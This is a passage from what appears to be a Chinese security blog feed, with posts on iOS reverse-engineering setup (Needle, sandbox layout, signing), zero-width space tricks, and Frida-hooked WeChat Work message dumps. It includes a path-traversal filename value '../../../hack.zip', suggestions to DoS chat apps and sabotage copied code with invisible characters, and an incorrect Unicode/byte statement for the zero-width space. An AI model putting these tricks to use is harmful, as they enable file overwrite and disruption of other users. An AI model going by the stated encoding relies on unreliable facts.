Dump<br>提取Mach-O文件信息</li><li>Substrate<br>Hook工具</li><li>AppList<br>查询所有安装的app</li></ol><h2 id="Needle"><a href="#Needle" class="headerlink" title="Needle"></a>Needle</h2><p>Needle是iOS平台上的一套动态测试，由mwr开发，类似于Android平台上的Drozer,但因系统的不同而功能不一。</p><p>以下为mac上配置Needle的过程：</p><ol><li><p>安装依赖</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#Core dependencies</span><br><span class="line">brew install python</span><br><span class="line">brew install libxml2</span><br><span class="line">xcode-select --install</span><br><span class="line"></span><br><span class="line">#Python packages</span><br><span class="line">sudo -H pip install --upgrade --user readline</span><br><span class="line">sudo -H pip install --upgrade --user paramiko</span><br><span class="line">sudo -H pip install --upgrade --user sshtunnel</span><br><span class="line">sudo -H pip install --upgrade --user frida</span><br><span class="line">sudo -H pip install --upgrade --user biplist</span><br><span class="line">#sshpass</span><br><span class="line">brew install https://raw.githubusercontent.com/kadwanev/bigboybrew/master/Library/Formula/sshpass.rb</span><br><span class="line"></span><br><span class="line">#mitmproxy</span><br><span class="line">wget https://github.com/mitmproxy/mitmproxy/releases/download/v0.17.1/mitmproxy-0.17.1-osx.tar.gz</span><br><span class="line">tar -xvzf mitmproxy-0.17.1-osx.tar.gz</span><br><span class="line">sudo cp mitmproxy-0.17.1-osx/mitm* /usr/local/bin/</span><br><span class="line"></span><br><span class="line">#Download source</span><br><span class="line">git clone https://github.com/mwrlabs/needle.git</span><br></pre></td></tr></table></figure></li><li><p>手机上安装needle代理<br>Cydia添加源<a href="http://mobiletools.mwrinfosecurity.com/cydia/,搜索NeedleAgent安装即可" target="_blank" rel="noopener">http://mobiletools.mwrinfosecurity.com/cydia/,搜索NeedleAgent安装即可</a></p></li><li><p>使用needle</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">$ python needle.py</span><br><span class="line">      __  _ _______ _______ ______         ______</span><br><span class="line">      | \ | |______ |______ | \     |      |______</span><br><span class="line">      | \_| |______ |______ |_____/ |_____ |______</span><br><span class="line">                  Needle v1.0 [mwr.to/needle]</span><br><span class="line">    [MWR InfoSecurity (@MWRLabs) - Marco Lancini (@LanciniMarco)]</span><br><span class="line"></span><br><span class="line">[needle] &gt; help</span><br><span class="line">Commands (type [help|?] &lt;topic&gt;):</span><br><span class="line">---------------------------------</span><br><span class="line">back exit info kill pull reload search shell show use</span><br><span class="line">exec_command help jobs load push resource set shell_local unset</span><br><span class="line"></span><br><span class="line">[needle] &gt; show options</span><br><span class="line"></span><br><span class="line">  Name                      Current Value                Required  Description</span><br><span class="line">  ------------------------  -------------                --------  -----------</span><br><span class="line">  AGENT_PORT                4444                         yes       Port on which the Needle Agent is listening</span><br><span class="line">  APP                                                    no        Bundle ID of the target application (e.g., com.example.app). Leave empty to launch wizard</span><br><span class="line">  DEBUG                     False                        yes       Enable debugging output</span><br><span class="line">  HIDE_SYSTEM_APPS          False                        yes       If set to True, only 3rd party apps will be shown</span><br><span class="line">  IP                        127.0.0.1                    yes       IP address of the testing device (set to localhost to use USB)</span><br><span class="line">  OUTPUT_FOLDER             /root/.needle/output         yes       Full path of the output folder, where to store the output of the modules</span><br><span class="line">  PASSWORD                  ********                     yes       SSH Password of the testing device</span><br><span class="line">  PORT                      2222                         yes       Port of the SSH agent on the testing device (needs to be != 22 to use USB)</span><br><span class="line">  PUB_KEY_AUTH              True                         yes       Use public key auth to authenticate to the device. Key must be present in the ssh-agent if a passphrase is used</span><br><span class="line">  SAVE_HISTORY              True                         yes       Persists command history across sessions</span><br><span class="line">  SKIP_OUTPUT_FOLDER_CHECK  False                        no        Skip the check that ensures the output folder does not already contain other files. It will automatically overwrite any file</span><br><span class="line">  USERNAME                  root                         yes       SSH Username of the testing device</span><br><span class="line">  VERBOSE                   True                         yes       Enable verbose output</span><br><span class="line"></span><br><span class="line">[needle] &gt;</span><br></pre></td></tr></table></figure></li></ol><h2 id="iOS目录结构"><a href="#iOS目录结构" class="headerlink" title="iOS目录结构"></a>iOS目录结构</h2><h3 id="OS-X和iOS目录对比"><a href="#OS-X和iOS目录对比" class="headerlink" title="OS X和iOS目录对比"></a>OS X和iOS目录对比</h3><p><img src="/images/pasted-37.png" alt="upload successful"></p><h3 id="系统目录"><a href="#系统目录" class="headerlink" title="系统目录"></a>系统目录</h3><ul><li>/Applications：存放所有的系统App和来自于Cydia的App，不包括StoreApp</li></ul><p><img src="/images/pasted-40.png" alt="upload successful"></p><ul><li>/Developer：如果一台设备连接Xcode后被指定为调试机，Xcode就会在iOS中生成该目录<ul><li>/Developer/Applications</li><li>/Developer/Library</li><li>/Developer/Tools</li><li>/Developer/usr</li></ul></li></ul><p><img src="/images/pasted-42.png" alt="upload successful"></p><ul><li>/Library：存放一些提供系统支持的数据<ul><li>/Library/MobileSubstrate/DynamicLibraries：存放Cydia安装程序的.plist和.dylib文件</li></ul></li></ul><p><img src="/images/pasted-41.png" alt="upload successful"></p><ul><li>/System/Library：iOS文件系统中最重要的目录之一，存放大量系统组件<ul><li>/System/Library/Frameworks：存放iOS中各种日常使用的framework</li><li>/System/Library/PrivateFrameworks：存放iOS中未公开的私有framework</li><li>/System/Library/CoreServices/SpringBoard.app：iOS桌面管理器</li></ul></li></ul><p><img src="/images/pasted-43.png" alt="upload successful"></p><ul><li>/User：用户目录（mobile用户的home目录），实际指向/var/mobile，存放大量用户数据</li></ul><p><img src="/images/pasted-44.png" alt="upload successful"></p><pre><code>- /var/mobile/Media/DCIM：存放照片- /var/mobile/Media/Recording：存放录音文件- /var/mobile/Library/SMS：存放短信数据库- /var/mobile/Library/Mail：存放邮件数据- /var/mobile/Containers：存放Apple Store的App。</code></pre><p><img src="/images/pasted-39.png" alt="upload successful"></p><pre><code>- /var/mobile/Containers/Bundle：存放所有StoreApp的可执行文件和相关资源- /var/mobile/Containers/Data：存放所有StoreApp的数据，沙盒目录的真实目录</code></pre><h3 id="应用沙盒"><a href="#应用沙盒" class="headerlink" title="应用沙盒"></a>应用沙盒</h3><p>iOS系统把每个应用（StoreApp）以及数据都放到一个沙盒（sandbox）里面，应用只能访问自己沙盒目录里面的文件、网络资源等（也有例外，比如系统通讯录、照相机、照片等能在用户授权的情况下被第三方应用访问）</p><p>应用沙盒目录结构如下图：</p><p><img src="/images/pasted-38.png" alt="upload successful"></p><p>沙盒在逻辑上包含两个部分：<strong>Bundle Container</strong>和<strong>Data Container</strong>，两者在iOS文件系统中的位置是平行的，分别是/var/mobile/Containers/Bundle和/var/mobile/Containers/Data。</p><p>实际开发中，通过NSHomeDirectory()方法获取到沙盒根目录对应的是Data Container的路径。在越狱设备中可以通过ipainstaller工具获得app路径：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">iPhone:~ root# ipainstaller -l</span><br><span class="line">...</span><br><span class="line">sg.vp.UnCrackable1</span><br><span class="line"></span><br><span class="line">iPhone:~ root# ipainstaller -i sg.vp.UnCrackable1</span><br><span class="line">...</span><br><span class="line">Bundle: /private/var/mobile/Containers/Bundle/Application/A8BD91A9-3C81-4674-A790-AF8CDCA8A2F1</span><br><span class="line">Application: /private/var/mobile/Containers/Bundle/Application/A8BD91A9-3C81-4674-A790-AF8CDCA8A2F1/UnCrackable Level 1.app</span><br><span class="line">Data: /private/var/mobile/Containers/Data/Application/A8AE15EE-DC8B-4F1C-91A5-1FED35258D87</span><br></pre></td></tr></table></figure></p><h4 id="Bundle-Container"><a href="#Bundle-Container" class="headerlink" title="Bundle Container"></a>Bundle Container</h4><p>bundle的概念源自于NeXTSTEP，它是一个按某种标准结构来组织的目录，Bundle中包含了<strong>二进制文件及运行所需的资源</strong>。</p><p>正向开发中常见的App和framework都是以bundle的形式存在。在越狱iOS中常见的PreferenceBundle是一种依附于Settings的App，结构与App类似，本质也是bundle。Framework也是bundle，但framework的bundle中存放的是一个dylib（动态库），而非可执行文件。</p><p>在正向开发时，我们上传至App Store的ipa（iPhone Application）包，解压后会有一个Payload目录，其内部又包含一个.app目录，这个目录就是一个App的目录结构，也是一个bundle。</p><p>Bundle Container位于/var/mobile/Containers/Bundle/Application/XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX/主要用于存放<strong>静态资源</strong>，主要包含以下目录和文件：</p><ul><li><p><strong>MyApp.app</strong><br>存放可执行文件和资源文件，包括：打包时的资源文件、本地文件、可执行文件、.plist文件。这个目录不会被iTunes同步。</p></li><li><p><strong>iTunesArtWork</strong></p></li><li><p><strong>iTunesMetadata.plist</strong></p><h4 id="Data-Container"><a href="#Data-Container" class="headerlink" title="Data Container"></a>Data Container</h4><p>Data Container位于/var/mobile/Containers/Data/Application/YYYYYYYY-YYYY-YYYY-YYYYYYYYYYYY/，主要用于存放<strong>App运行时产生的动态数据</strong>，其主要包含以下目录和文件：</p></li><li><strong>Documents</strong><br>存放应用运行时生成的并且需要保存的不可再生数据。注：iTunes或iCloud同步设备时会备份该目录</li><li><strong>Library</strong><ul><li>Library/Caches 存放应用运行时生成且需要保存的可再生数据，比如网络请求，用户需要负责删除对应文件。iTunes或iCloud不同步。</li><li>Library/Preferences 存放偏好设置。使用NSUserDefaults写的设置数据都会保存在该目录下的一个plist文件中。iTunes或iCloud同步设备时备份该目录。</li></ul></li><li><strong>tmp</strong><br>存放应用下次启动不再需要的临时文件。当应用不再需要这些文件的时候，需要主动将其删除。（当应用不再运行的时候，系统可能会将此目录清空。）这个目录不会被iTunes同步。</li></ul><h4 id="沙盒路径获取"><a href="#沙盒路径获取" class="headerlink" title="沙盒路径获取"></a>沙盒路径获取</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// 沙盒目录</span><br><span class="line">NSLog(@&quot;%@&quot;,NSHomeDirectory());</span><br><span class="line">  </span><br><span class="line">// MyApp.app</span><br><span class="line">NSLog(@&quot;%@&quot;,[[NSBundle mainBundle] bundlePath]);</span><br><span class="line">  </span><br><span class="line">// Documents</span><br><span class="line">NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);</span><br><span class="line">NSString *docPath = [paths objectAtIndex:0];</span><br><span class="line">NSLog(@&quot;%@&quot;,docPath);</span><br><span class="line">  </span><br><span class="line">// Library</span><br><span class="line">NSArray *paths = NSSearchPathForDirectoriesInDomains(NSLibraryDirectory, NSUserDomainMask, YES);</span><br><span class="line">NSString *libPath = [paths objectAtIndex:0];</span><br><span class="line">NSLog(@&quot;%@&quot;,libPath);</span><br><span class="line">  </span><br><span class="line">// tmp</span><br><span class="line">NSLog(@&quot;%@&quot;,NSTemporaryDirectory());</span><br></pre></td></tr></table></figure><h2 id="iOS二进制文件"><a href="#iOS二进制文件" class="headerlink" title="iOS二进制文件"></a>iOS二进制文件</h2><p>iOS逆向的目标主要包含三类二进制文件：<strong>Application</strong>、<strong>Dynamic Library</strong>、<strong>Daemon</strong></p><h3 id="Application"><a href="#Application" class="headerlink" title="Application"></a><strong>Application</strong></h3><p>Application，即我们最熟悉的App。App的Bundle目录有以下三个部分比较重要：</p><ul><li><p>Info.plist<br>Info.plist记录了App的基本信息，如：bundle identifier、可执行文件名、图标文件名等。</p></li><li><p>可执行文件<br>查看Info.plist，即可定位可执行文件</p></li><li><p>lproj目录<br>lproj目录下存放的是各种本地化的字符串</p></li></ul><p><strong>系统App VS. StoreApp</strong><br>/Applications/目录下存放系统App（包括CydiaApp）；/var/mobile/Containers/目录下存放StoreApp。其区别在于：</p><ul><li><p>目录结构<br>两种App的Bundle目录区别不大，都含有Info.plist、可执行文件、lproj目录等。只是Data目录的位置不同：StoreApp的数据目录在/var/mobile/Containers/Data/下，以mobile权限运行的系统App的数据目录在/var/mobile/下，以root权限运行的系统App的数据目录在/var/root/下。</p></li><li><p>安装格式和权限<br>Cydia App的安装格式一般是deb，StoreApp的安装格式一般是ipa。前者的属主用户和属主组一般是root和admin，能够以root权限运行；后者的属主用户和属主组都是mobile，只能以mobile权限运行。</p></li></ul><h3 id="Dynamic-Library"><a href="#Dynamic-Library" class="headerlink" title="Dynamic Library"></a><strong>Dynamic Library</strong></h3><p>Dynamic Library简称dylib，即动态链接库。在正向开发中，在Xcode工程中导入的各种framework，链接的各种lib，其本质都是dylib。</p><p>在iOS中，lib分为static和dynamic两种，其中static lib在编译阶段成为App可执行文件的一部分，会增加可执行文件的大小。dylib则不会改变可执行文件的大小，只有当App运行时调用到dylib时，iOS才会把它加载进内存，成为App进程的一部分。</p><p>dylib是逆向工程的重要目标类型，但其本身并不是可执行文件，不能独立运行，只能为别的进程服务，而且它们寄生在别的进程里，成为这个进程的一部分。因此，dylib的权限是由它寄生的那个App决定的，同一个dylib寄生在系统App和StoreApp里时的权限是不同的。</p><p>越狱iOS中，Cydia里的各种tweak无一不是以dylib的形式工作的。</p><h3 id="Daemon"><a href="#Daemon" class="headerlink" title="Daemon"></a><strong>Daemon</strong></h3><p>iOS的daemon主要由一个可执行文件和一个plist文件构成。iOS的根进程是launchd，其会在开机时检查/System/Library/LaunchDaemons和/Library/LaunchDaemons下所有格式符合规定的plist文件，然后启动对应的daemon。这里的plist文件与App中的Info.plist文件作用类似，即记录Daemon的基本信息。</p><h2 id="配置文件（provisioning-profile）和开发者证书"><a href="#配置文件（provisioning-profile）和开发者证书" class="headerlink" title="配置文件（provisioning profile）和开发者证书"></a>配置文件（provisioning profile）和开发者证书</h2><p>iOS有严格的代码签名检测，只用通过签名检测的代码才可以运行，而代码签名需要provisioning profile。</p><p>provisioning profile（供应配合文件）是由苹果签名的一个plist文件，Provisioning Profile文件包含了：证书，App ID，设备，后缀名为.mobileprovision。<br><img src="/images/pasted-45.png" alt="upload successful"><br>Provisioning Profile决定Xcode用哪个证书（公钥）/私钥组合（Key Pair/Signing Identity）来签署应用程序（Signing Product）,将在应用程序打包时嵌入到.ipa包里。安装应用程序时，Provisioning Profile文件被拷贝到iOS设备中，运行该iOS App的设备也通过它来认证安装的程序。</p><p>如果要打包或者在真机上运行一个APP，一般要经历以下三步：</p><ul><li>首先，需要证书对应的私钥来进行签名，用于标识这个APP是合法、安全、完整的；</li><li>其次，需要指明它的App ID，并且验证Bundle ID是否与其一致；</li><li>最后，如果是真机调试，需要确认这台设备是否授权运行该APP。</li></ul><p>获得Provisioning Profile和证书有两个途径：</p><ul><li><p><strong>1. 注册iOS开发者账号</strong><br>在<a href="https://developer.apple.com/programs/enroll/" target="_blank" rel="noopener">https://developer.apple.com/programs/enroll/</a> 上注册开发者账号，个人开发者需要缴纳99$费用，这种途径开发的应用可以在apple store上发行。<br>使用如下命令可以列出所有的账号：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ security find-identity -p codesigning -v</span><br><span class="line">  1) 61FA3547E0AF42A11E233F6A2B255E6B6AF262CE &quot;iPhone Distribution: Vantage Point Security Pte. Ltd.&quot;</span><br><span class="line">  2) 8004380F331DCA22CC1B47FB1A805890AE41C938 &quot;iPhone Developer: Bernhard Müller (RV852WND79)&quot;</span><br></pre></td></tr></table></figure></li><li><p><strong>2. 使用iTunes账号</strong><br>apple允许配置一个免费的provisioning profile，允许在设备上对自己开发的应用进行调试，但不能上传到apple store上。</p></li></ul><p>参考：</p><ol><li><a href="https://www.jianshu.com/p/351be39f959e" target="_blank" rel="noopener">https://www.jianshu.com/p/351be39f959e</a></li><li><a href="https://www.nccgroup.trust/au/about-us/newsroom-and-events/blogs/2016/october/ios-instrumentation-without-jailbreak/" target="_blank" rel="noopener">https://www.nccgroup.trust/au/about-us/newsroom-and-events/blogs/2016/october/ios-instrumentation-without-jailbreak/</a></li></ol><p>参考资料：</p><ol><li>iOS逆向工程基础篇 <a href="http://chuquan.me/2018/02/06/ios-reverse-engineering-basis/" target="_blank" rel="noopener">http://chuquan.me/2018/02/06/ios-reverse-engineering-basis/</a></li><li>owasp - Setting up a Testing Environment for iOS Apps <a href="https://github.com/OWASP/owasp-mstg/blob/master/Document/0x06b-Basic-Security-Testing.md" target="_blank" rel="noopener">https://github.com/OWASP/owasp-mstg/blob/master/Document/0x06b-Basic-Security-Testing.md</a></li><li>iOS底层基础知识-文件目录结构 <a href="http://www.cnblogs.com/wujy/archive/2016/02/13/5188302.html" target="_blank" rel="noopener">http://www.cnblogs.com/wujy/archive/2016/02/13/5188302.html</a></li><li>mac os术语表 <a href="https://bbs.feng.com/read-htm-tid-249.html" target="_blank" rel="noopener">https://bbs.feng.com/read-htm-tid-249.html</a></li></ol>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>零宽度空格 Zero-width space</title>
      <link href="/2018/05/14/%E9%9B%B6%E5%AE%BD%E5%BA%A6%E7%A9%BA%E6%A0%BC-Zero-width-space/"/>
      <url>/2018/05/14/%E9%9B%B6%E5%AE%BD%E5%BA%A6%E7%A9%BA%E6%A0%BC-Zero-width-space/</url>
      
        <content type="html"><![CDATA[<h1 id="0x0-简介"><a href="#0x0-简介" class="headerlink" title="0x0 简介"></a>0x0 简介</h1><p>零宽度空格，顾名思义即，具有空格的功能，但宽度为零。例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Left​​​​​​​​​​Right</span><br></pre></td></tr></table></figure></p><p>上述文本中，我们看到的是LeftRight，但实际上在Left和Right之间有10个Zero-width space，它不占用宽度，但占用字节空间。</p><h1 id="0x1-实例"><a href="#0x1-实例" class="headerlink" title="0x1 实例"></a>0x1 实例</h1><p>Zero-width space的Unicode编码为U+FEFF，二进制编码为“\xE2\x80\x8E”,根据维基百科描述，其主要用于后台处理字符边界而又无需可见空格的情况。</p><p>例如，下边两个字符串，我们在任意位置鼠标双击时会看到明显效果，</p><p>包含Zero-width space，双击任意位置选中某个单词<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Lorem​Ipsum​Dolor​Sit​Amet​Consectetur​Adipiscing​Elit​Sed​Do​Eiusmod​Tempor​Incididunt​Ut​Labore​Et​Dolore​Magna​Aliqua​Ut​Enim​Ad​Minim​Veniam​Quis​Nostrud​Exercitation​Ullamco​Laboris​Nisi​Ut​Aliquip​Ex​Ea​Commodo​Consequat​Duis​Aute​Irure​Dolor​In​Reprehenderit​In​Voluptate​Velit​Esse​Cillum​Dolore​Eu​Fugiat​Nulla​Pariatur​Excepteur​Sint​Occaecat​Cupidatat​Non​Proident​Sunt​In​Culpa​Qui​Officia​Deserunt​Mollit​Anim​Id​Est​Laborum</span><br></pre></td></tr></table></figure></p><p>不含Zero-width space，双击任意位置选中全部字符<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LoremIpsumDolorSitAmetConsecteturAdipiscingElitSedDoEiusmodTemporIncididuntUtLaboreEtDoloreMagnaAliquaUtEnimAdMinimVeniamQuisNostrudExercitationUllamcoLaborisNisiUtAliquipExEaCommodoConsequatDuisAuteIrureDolorInReprehenderitInVoluptateVelitEsseCillumDoloreEuFugiatNullaPariaturExcepteurSintOccaecatCupidatatNonProidentSuntInCulpaQuiOfficiaDeseruntMollitAnimIdEstLaborum</span><br></pre></td></tr></table></figure></p><h1 id="0x2-攻击"><a href="#0x2-攻击" class="headerlink" title="0x2 攻击"></a>0x2 攻击</h1><h2 id="DoS攻击"><a href="#DoS攻击" class="headerlink" title="DoS攻击"></a>DoS攻击</h2><p>由于该字符不显示但占用空间，故可以用来发送大量的该字符来DoS，用户看不到任何字符，但已经把空间占满。例如，对QQ、微信等DoS攻击</p><p>PS: 微信发送的纯文本大小为16K,测试大量零宽度空格不影响。</p><h2 id="UI-Spoof"><a href="#UI-Spoof" class="headerlink" title="UI Spoof"></a>UI Spoof</h2><p>例如CTF题目中提交flag时可以加几个这个字符</p><p>再例如在字符串相等判断的代码里加几个这个字符，搞死抄袭代码的程序员:)</p><p>参考文献</p><ol><li>维基百科 <a href="https://en.wikipedia.org/wiki/Zero-width_space" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Zero-width_space</a></li></ol>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>企业微信的消息</title>
      <link href="/2018/05/11/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E7%9A%84%E6%B6%88%E6%81%AF/"/>
      <url>/2018/05/11/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E7%9A%84%E6%B6%88%E6%81%AF/</url>
      
        <content type="html"><![CDATA[<p>企业微信使用protobuf nano对数据进行封装，使用Frida进行批量hook，可以打印出所有的序列化消息。</p><h2 id="LocationMessage"><a href="#LocationMessage" class="headerlink" title="LocationMessage"></a>LocationMessage</h2><p>Hook “com.tencent.wework.foundation.model.pb.WwRichmessage$LocationMessage”函数<br>消息内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">address: &quot;\345\214\227\344\272\254\345\270\202\345\214\227\344\272\254\345\270\202\346\265\267\346\267\200\345\214\272\345\275\251\345\222\214\345\235\212\350\267\257\345\214\227\345\233\233\347\216\257\350\245\277\350\267\25766\345\217\267&quot;</span><br><span class="line">latitude: 39.984293</span><br><span class="line">longitude: 116.307449</span><br><span class="line">title: &quot;\345\214\227\345\233\233\347\216\257\350\245\277\350\267\25766\345\217\267&quot;</span><br><span class="line">zoom: 15.0</span><br></pre></td></tr></table></figure></p><h2 id="FileMessage"><a href="#FileMessage" class="headerlink" title="FileMessage"></a>FileMessage</h2><p>Hook “com.tencent.wework.foundation.model.pb.WwRichmessage$FileMessage”函数</p><p>filename曾经存在路径穿越漏洞，通过hook String.getBytes()修改filename为”../../../hack.zip”<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">aes_key: &quot;&quot;</span><br><span class="line">decrypt_ret: -1</span><br><span class="line">encrypt_key: &quot;&quot;</span><br><span class="line">encrypt_size: 0</span><br><span class="line">extra: &quot;&quot;</span><br><span class="line">file_id: &quot;&quot;</span><br><span class="line">file_name: &quot;open_screen_bg_img_1557.png&quot;</span><br><span class="line">flags: 0</span><br><span class="line">height: 0</span><br><span class="line">is_hd: false</span><br><span class="line">iscomplex: false</span><br><span class="line">md5: &quot;&quot;</span><br><span class="line">mid_img_size: 0</span><br><span class="line">mid_thumbnail_file_id: &quot;&quot;</span><br><span class="line">mid_thumbnail_path: &quot;/storage/emulated/0/Tencent/WeixinWork/uploadTempMidbimage/00ceba176d6be5ef68f045defd4280c0.midimage&quot;</span><br><span class="line">random_key: &quot;&quot;</span><br><span class="line">receiver_deviceid: &quot;&quot;</span><br><span class="line">sender_deviceid: &quot;&quot;</span><br><span class="line">session_id: &quot;&quot;</span><br><span class="line">size: 116907</span><br><span class="line">thumb_img_size: 0</span><br><span class="line">thumbnail_file_id: &quot;&quot;</span><br><span class="line">thumbnail_path: &quot;/storage/emulated/0/Tencent/WeixinWork/uploadTempThumbimage/00ceba176d6be5ef68f045defd4280c0.thumbimage&quot;</span><br><span class="line">url: &quot;/storage/emulated/0/wandoujia/downloader/openscreen/open_screen_bg_img_1557.png&quot;</span><br><span class="line">voice_time: 0</span><br><span class="line">wechat_auth_key: &quot;&quot;</span><br><span class="line">wechat_cdn_ld_aeskey: &quot;&quot;</span><br><span class="line">wechat_cdn_ld_height: 193</span><br><span class="line">wechat_cdn_ld_md5: &quot;&quot;</span><br><span class="line">wechat_cdn_ld_size: 0</span><br><span class="line">wechat_cdn_ld_url: &quot;&quot;</span><br><span class="line">wechat_cdn_ld_width: 290</span><br><span class="line">width: 0</span><br></pre></td></tr></table></figure></p><h2 id="EmotionMessage"><a href="#EmotionMessage" class="headerlink" title="EmotionMessage"></a>EmotionMessage</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">aes_key: &quot;&quot;</span><br><span class="line">create_time: 0</span><br><span class="line">description: &quot;\345\271\262\345\276\227\346\274\202\344\272\256&quot;</span><br><span class="line">file_id: &quot;&quot;</span><br><span class="line">group_id: &quot;100&quot;</span><br><span class="line">height: 240</span><br><span class="line">md5: &quot;eb1de22cdf24034f2c06edebc529e90c&quot;</span><br><span class="line">random_url: &quot;&quot;</span><br><span class="line">size: 0</span><br><span class="line">source_type: 1</span><br><span class="line">src: 2</span><br><span class="line">static_url: &quot;http://p.qpic.cn/pic_wework/1802732579/04027e002a09edf9965ee6fd369f87b6390c933341504f32/0&quot;</span><br><span class="line">type: 2</span><br><span class="line">url: &quot;http://p.qpic.cn/pic_wework/1802732579/ecea96e80f0c70e81b6d5107416cec562326901d20a61bc4/0&quot;</span><br><span class="line">width: 240</span><br><span class="line">wx_emotion_buffer: &quot;&quot;</span><br></pre></td></tr></table></figure><h2 id="RichMessage"><a href="#RichMessage" class="headerlink" title="RichMessage"></a>RichMessage</h2><ol><li>普通文本</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">messages &lt;</span><br><span class="line">  content_type: 0</span><br><span class="line">  data: &quot;\012\025\345\207\217\350\202\245\346\225\210\346\236\234\351\203\275\345\207\221\345\207\221&quot;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><ol><li>emoji表情</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">messages &lt;</span><br><span class="line">  content_type: 3</span><br><span class="line">  data: &quot;\012\005[\350\211\262]&quot;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><h2 id="VideoMessage"><a href="#VideoMessage" class="headerlink" title="VideoMessage"></a>VideoMessage</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">aes_key: &quot;6f899d3e4c364a2baa70cfce00617a03&quot;</span><br><span class="line">decrypt_ret: -1</span><br><span class="line">encrypt_key: &quot;&quot;</span><br><span class="line">encrypt_size: 1029481</span><br><span class="line">flags: 0</span><br><span class="line">md5: &quot;4b49f7136f83d563c08a0fce5d7d61d0&quot;</span><br><span class="line">preview_img_aes_key: &quot;&quot;</span><br><span 